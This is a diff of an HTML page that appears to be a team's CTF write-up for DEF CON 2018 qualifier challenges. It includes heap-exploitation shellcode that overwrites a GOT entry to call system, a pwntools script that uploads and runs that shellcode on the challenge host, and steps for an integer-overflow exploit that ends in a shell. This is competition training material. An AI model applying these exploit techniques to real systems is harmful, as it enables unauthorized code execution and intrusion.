-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x220000</span>],<span class="hljs-number">0x131794d</span>     # overwrite the fd on <span class="hljs-number">0x1317940</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">2</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x220004</span>],<span class="hljs-number">0x0</span>           #
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x10000</span>],<span class="hljs-number">0xc</span>             # malloc once
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x10000</span>],<span class="hljs-number">0xc</span>             # malloc twice , now we have a chunk <span class="hljs-meta">at</span> <span class="hljs-number">0x131794d</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x210000</span>],<span class="hljs-number">0xa0000000</span>    # forge a fake chunk address on <span class="hljs-number">0x1317960</span> <span class="hljs-keyword">and</span> the address will be free got (<span class="hljs-number">0x11301a0</span>)
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x210004</span>],<span class="hljs-number">0x11301</span>       #
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x240000</span>],<span class="hljs-number">0x6e65f9</span>      # Overwrite free got. The new address will trigger system(<span class="hljs-string">"cat ./flag"</span>)
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x240004</span>],<span class="hljs-number">0x0</span>           #
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x120000</span>],<span class="hljs-number">0x0</span>           # Trigger free <span class="hljs-keyword">and</span> get the flag !!
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span>
-  <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rdi</span>
-  <span class="hljs-keyword">syscall</span>
-# nasm -felf64 a.asm -o a.o &amp;&amp; ld a.o &amp;&amp; base64 a.out &gt; shellcode</code></pre></li>
-<li>And the code to send shellcode:
-<code>`</code>python
-import sys
-import struct
-import hashlib
-from pwn import *</li>
+<li>The shellcode:</li>
 </ul>
-<h1 id="inspired-by-c3ctf's-pow-1"><a class="header-link" href="#inspired-by-c3ctf's-pow-1"></a>inspired by C3CTF&#39;s POW</h1>
-<p>def pow_hash(challenge, solution):
-    return hashlib.sha256(challenge.encode(&#39;ascii&#39;) + struct.pack(&#39;&lt;Q&#39;, solution)).hexdigest()</p>
-<p>def check_pow(challenge, n, solution):
-    h = pow_hash(challenge, solution)
-    return (int(h, 16) % (2**n)) == 0</p>
-<p>def solve_pow(challenge, n):
-    candidate = 0
-    while True:
-        if check_pow(challenge, n, candidate):
-            return candidate
-        candidate += 1</p>
-<p>r=remote(&quot;11d9f496.quals2018.oooverflow.io&quot;,31337)
-r.recvuntil(&quot;Challenge:&quot;)
-cha=r.recvline().strip(&quot;\n&quot;)
-r.recvuntil(&quot;n:&quot;)
-n=r.recvline().strip(&quot;\n&quot;)</p>
-<p>solution = solve_pow(cha[1:], int(n))</p>
-<p>r.sendline(str(solution))
-r.recvuntil(&quot;/ #&quot;)
-f=open(&quot;shellcode&quot;)
-for i in f.readlines():
-  r.sendline(&#39;echo &quot;&#39;+i.strip(&#39;\n&#39;)+&#39;&quot; &gt;&gt; 1234&#39;)
-r.sendline(&quot;base64 -d 1234 &gt; bb&quot;)
-r.sendline(&quot;chmod +x ./bb&quot;)
-r.sendline(&quot;./bb&quot;)
-r.interactive()</p>
-<h1 id="the-flag-is-ooo{did-you-know-that-the-cloud-is-safe}"><a class="header-link" href="#the-flag-is-ooo{did-you-know-that-the-cloud-is-safe}"></a>The flag is OOO{did you know that the cloud is safe}</h1>
-<pre class="hljs"><code>
-
-<span class="python"><span class="hljs-comment">### Race Wars</span>
-<span class="hljs-number">1.</span> The vulnerability exists during the program asks <span class="hljs-keyword">for</span> tire amount; when doing so, we can apply <span class="hljs-keyword">for</span> <span class="hljs-number">0x8000000</span> tires to cause int overflow (<span class="hljs-number">0x8000000</span>*<span class="hljs-number">0x20</span> = <span class="hljs-number">0</span>), <span class="hljs-keyword">and</span> make the program allocate <span class="hljs-number">0</span>-size memory, but the tires struct can still be placed on heap <span class="hljs-keyword">for</span> us to control.
-<span class="hljs-number">2.</span> Use transmission function to overlap the tires struct <span class="hljs-keyword">and</span> transmission struct 
-<span class="hljs-number">3.</span> Use modify_tires functions to set all the attributes of tire <span class="hljs-keyword">as</span> <span class="hljs-number">0xffff</span>
-<span class="hljs-number">4.</span> Use modify_transmission function to get relative address read/write capability of arbitrary memory
-<span class="hljs-number">5.</span> Read heap address <span class="hljs-keyword">and</span> code GOT address to get libc address, then modify exit GOT to one_gadget, call exit, <span class="hljs-keyword">and</span> get shell
-* code:
-```python=
+<pre class="hljs"><code><span class="hljs-meta">section</span> .data
+    msg <span class="hljs-built_in">db</span>      <span class="hljs-string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>
+<span class="hljs-meta">section</span> .text
+    <span class="hljs-meta">global</span> _start
+<span class="hljs-symbol">_start:</span>
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, msg
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-number">2</span>
+    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>
+    <span class="hljs-keyword">syscall</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0x1000000</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-number">3</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r10</span>, <span class="hljs-number">1</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>, <span class="hljs-number">0</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-number">9</span>
+    <span class="hljs-keyword">syscall</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rax</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">WORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x20000</span>],<span class="hljs-number">0xc</span>             # malloc a chunk on <span class="hljs-number">0x1317940</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">2</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x120000</span>],<span class="hljs-number">0xc</span>            # free the chunk on <span class="hljs-number">0x1317940</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">2</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x220000</span>],<span class="hljs-number">0x131794d</span>     # overwrite the fd on <span class="hljs-number">0x1317940</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">2</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x220004</span>],<span class="hljs-number">0x0</span>           #
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x10000</span>],<span class="hljs-number">0xc</span>             # malloc once
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x10000</span>],<span class="hljs-number">0xc</span>             # malloc twice , now we have a chunk <span class="hljs-meta">at</span> <span class="hljs-number">0x131794d</span>
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x210000</span>],<span class="hljs-number">0xa0000000</span>    # forge a fake chunk address on <span class="hljs-number">0x1317960</span> <span class="hljs-keyword">and</span> the address will be free got (<span class="hljs-number">0x11301a0</span>)
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x210004</span>],<span class="hljs-number">0x11301</span>       #
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x240000</span>],<span class="hljs-number">0x6e65f9</span>      # Overwrite free got. The new address will trigger system(<span class="hljs-string">"cat ./flag"</span>)
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x240004</span>],<span class="hljs-number">0x0</span>           #
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x120000</span>],<span class="hljs-number">0x0</span>           # Trigger free <span class="hljs-keyword">and</span> get the flag !!
+    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span>
+    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rdi</span>
+    <span class="hljs-keyword">syscall</span>
+# nasm -felf64 a.asm -o a.o &amp;&amp; ld a.o &amp;&amp; base64 a.out &gt; shellcode</code></pre><ul class="list">
+<li>And the code to send shellcode:</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> struct
+<span class="hljs-keyword">import</span> hashlib
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># inspired by C3CTF's POW</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pow_hash</span><span class="hljs-params">(challenge, solution)</span>:</span>
+    <span class="hljs-keyword">return</span> hashlib.sha256(challenge.encode(<span class="hljs-string">'ascii'</span>) + struct.pack(<span class="hljs-string">'&lt;Q'</span>, solution)).hexdigest()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_pow</span><span class="hljs-params">(challenge, n, solution)</span>:</span>
+    h = pow_hash(challenge, solution)
+    <span class="hljs-keyword">return</span> (int(h, <span class="hljs-number">16</span>) % (<span class="hljs-number">2</span>**n)) == <span class="hljs-number">0</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_pow</span><span class="hljs-params">(challenge, n)</span>:</span>
+    candidate = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+        <span class="hljs-keyword">if</span> check_pow(challenge, n, candidate):
+            <span class="hljs-keyword">return</span> candidate
+        candidate += <span class="hljs-number">1</span>
+
+r=remote(<span class="hljs-string">"11d9f496.quals2018.oooverflow.io"</span>,<span class="hljs-number">31337</span>)
+r.recvuntil(<span class="hljs-string">"Challenge:"</span>)
+cha=r.recvline().strip(<span class="hljs-string">"\n"</span>)
+r.recvuntil(<span class="hljs-string">"n:"</span>)
+n=r.recvline().strip(<span class="hljs-string">"\n"</span>)
+
+solution = solve_pow(cha[<span class="hljs-number">1</span>:], int(n))
+
+r.sendline(str(solution))
+r.recvuntil(<span class="hljs-string">"/ #"</span>)
+f=open(<span class="hljs-string">"shellcode"</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():
+  r.sendline(<span class="hljs-string">'echo "'</span>+i.strip(<span class="hljs-string">'\n'</span>)+<span class="hljs-string">'" &gt;&gt; 1234'</span>)
+r.sendline(<span class="hljs-string">"base64 -d 1234 &gt; bb"</span>)
+r.sendline(<span class="hljs-string">"chmod +x ./bb"</span>)
+r.sendline(<span class="hljs-string">"./bb"</span>)
+r.interactive()
+<span class="hljs-comment"># The flag is OOO{did you know that the cloud is safe}</span></code></pre><h3 id="race-wars"><a class="header-link" href="#race-wars"></a>Race Wars</h3>
+<ol class="list">
+<li>The vulnerability exists during the program asks for tire amount; when doing so, we can apply for 0x8000000 tires to cause int overflow (0x8000000*0x20 = 0), and make the program allocate 0-size memory, but the tires struct can still be placed on heap for us to control.</li>
+<li>Use transmission function to overlap the tires struct and transmission struct </li>
+<li>Use modify_tires functions to set all the attributes of tire as 0xffff</li>
+<li>Use modify_transmission function to get relative address read/write capability of arbitrary memory</li>
+<li>Read heap address and code GOT address to get libc address, then modify exit GOT to one_gadget, call exit, and get shell</li>
+<li>code:</li>
+</ol>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">import</span> sys
 <span class="hljs-keyword">import</span> time
 <span class="hljs-keyword">import</span> random
@@ -1248,7 +1302,7 @@ elf = ELF(binary)
   r.sendline(<span class="hljs-string">"ls"</span>)
 
 
-  r.interactive()</span></code></pre><h3 id="say-hi!"><a class="header-link" href="#say-hi!"></a>Say Hi!</h3>
+  r.interactive()</code></pre><h3 id="say-hi!"><a class="header-link" href="#say-hi!"></a>Say Hi!</h3>
 <p>You can send anything as the flag !!
 <code>OOO{Happy Mother&#39;s Day!!}`</code></p>
 <h3 id="exzendtential-crisis-(unsolved)"><a class="header-link" href="#exzendtential-crisis-(unsolved)"></a>exzendtential-crisis (unsolved)</h3>
@@ -1293,7 +1347,7 @@ v12 = sub_34E0;
 v11 = (__int64 (__fastcall *)(<span class="hljs-keyword">char</span> *, __int64, <span class="hljs-keyword">int</span>))sub_3220;</code></pre><h2 id="guest-chefs"><a class="header-link" href="#guest-chefs"></a>Guest Chefs</h2>
 <h3 id="php-eval-white-list"><a class="header-link" href="#php-eval-white-list"></a>PHP Eval White-List</h3>
 <ul class="list">
-<li>run <code>die(&quot;`../flag`&quot;);</code></li>
+<li>run <code>die(&quot;</code>../flag<code>&quot;);</code></li>
 <li><code>OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}</code></li>
 </ul>
 <h3 id="ghettohackers:-throwback"><a class="header-link" href="#ghettohackers:-throwback"></a>ghettohackers: Throwback</h3>
